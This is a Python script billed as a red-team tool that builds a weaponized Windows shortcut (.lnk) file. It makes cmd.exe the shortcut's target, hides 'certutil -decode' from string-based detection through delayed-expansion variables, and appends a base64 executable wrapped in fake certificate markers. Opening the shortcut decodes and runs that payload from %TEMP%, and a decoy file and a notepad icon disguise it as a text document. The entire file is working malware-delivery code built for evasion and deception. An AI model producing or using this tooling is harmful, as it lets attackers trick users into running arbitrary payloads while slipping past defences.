#!/usr/bin/env python3

# 
# LNK-PY by LiquidSky (10/22/26)
# 

import argparse
import base64
import os
import pathlib
import sys

try:
    import winshell
except ImportError:
    winshell = None

# Colors for professional CLI output
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def log_info(msg):
    print(f"{Colors.OKBLUE}[*]{Colors.ENDC} {msg}")

def log_success(msg):
    print(f"{Colors.OKGREEN}[+]{Colors.ENDC} {msg}")

def log_error(msg):
    print(f"{Colors.FAIL}[-]{Colors.ENDC} {msg}")

def log_warn(msg):
    print(f"{Colors.WARNING}[!]{Colors.ENDC} {msg}")

def build_obfuscated_cmd(shortcut_name, decoy_file=None):
    """
    Constructs an obfuscated cmd command that uses delayed expansion
    to evade simple string-based detection of 'certutil' and '-decode'.
    """
    # Use %TEMP% for the extracted payload
    temp_payload = os.path.join(os.environ.get('TEMP', 'C:\\Temp'), "sys_update.tmp")
    
    # Obfuscation mappings
    # We use delayed expansion variables (!var!)
    # cmd /v:on enables this.
    
    # set a=ce, b=rtutil, c=-decode, d=shortcut.lnk, e=temp_payload
    # %a%%b% %c% %d% %e%
    
    cmd = (
        f"set \"a=ce\"&set \"b=rtutil\"&set \"c=-decode\"&"
        f"set \"d={shortcut_name}.lnk\"&set \"e={temp_payload}\"&"
        f"!a!!b! !c! !d! !e! & start !e!"
    )
    
    if decoy_file:
        cmd += f" & start {decoy_file}"
    
    # Wrap in cmd /v:on /c
    return f"/v:on /c \"{cmd}\""

def create_weaponized_lnk(args):
    if winshell is None:
        log_error("The 'winshell' library is required. Please install it: pip install winshell pypiwin32")
        sys.exit(1)

    payload_path = pathlib.Path(args.payload).resolve()
    if not payload_path.exists():
        log_error(f"Payload file not found: {payload_path}")
        sys.exit(1)

    shortcut_name = args.name
    shortcut_path = pathlib.Path(f"{shortcut_name}.lnk").resolve()
    
    log_info(f"Initializing weaponization for: {shortcut_name}.lnk")
    
    try:
        with winshell.shortcut(str(shortcut_path)) as shortcut:
            # The target is cmd.exe
            shortcut.path = "C:\\Windows\\System32\\cmd.exe"
            # The arguments contain our obfuscated payload delivery logic
            shortcut.arguments = build_obfuscated_cmd(shortcut_name, args.decoy)
            # Set metadata for stealth
            shortcut.description = args.description
            shortcut.working_directory = str(payload_path.parent)
            shortcut.icon_location = args.icon
            
            log_success("LNK shell structure successfully created.")
    except Exception as e:
        log_error(f"Critical error during LNK creation: {e}")
        sys.exit(1)

    # Embed the payload as a base64 blob at the end of the LNK file
    # certutil -decode will find this blob if it's wrapped in certificates markers
    log_info("Embedding encrypted payload blob...")
    try:
        with open(payload_path, "rb") as f:
            encoded_payload = base64.b64encode(f.read())
        
        with open(shortcut_path, "ab") as f:
            # Using CRLF for better compatibility with certutil
            f.write(b"\r\n-----BEGIN CERTIFICATE-----\r\n")
            f.write(encoded_payload)
            f.write(b"\r\n-----END CERTIFICATE-----\r\n")
            
        log_success(f"Payload successfully injected into {shortcut_path}")
    except Exception as e:
        log_error(f"Failed to inject payload: {e}")
        sys.exit(1)

    log_success(f"Weaponized LNK created: {shortcut_path}")
    log_info("Ready for deployment.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="LNK Weaponizer - Professional Red Team Tool")
    parser.add_argument("-p", "--payload", required=True, help="Path to the payload executable (e.g., payload.exe)")
    parser.add_argument("-n", "--name", required=True, help="Name of the shortcut to create (without .lnk)")
    parser.add_argument("-d", "--decoy", help="Path to the decoy file to open (e.g., password.txt)")
    parser.add_argument("--description", default="Text Document", help="Description/Comment for the shortcut (default: Text Document)")
    parser.add_argument("--icon", default=("C:\\Windows\\notepad.exe", 0), help="Icon location 'path,index' (e.g., 'C:\\Windows\\notepad.exe,0')")

    args = parser.parse_args()
    
    # Parse icon if provided as string
    if isinstance(args.icon, str) and ',' in args.icon:
        path, index = args.icon.split(',')
        args.icon = (path, int(index))

    create_weaponized_lnk(args)
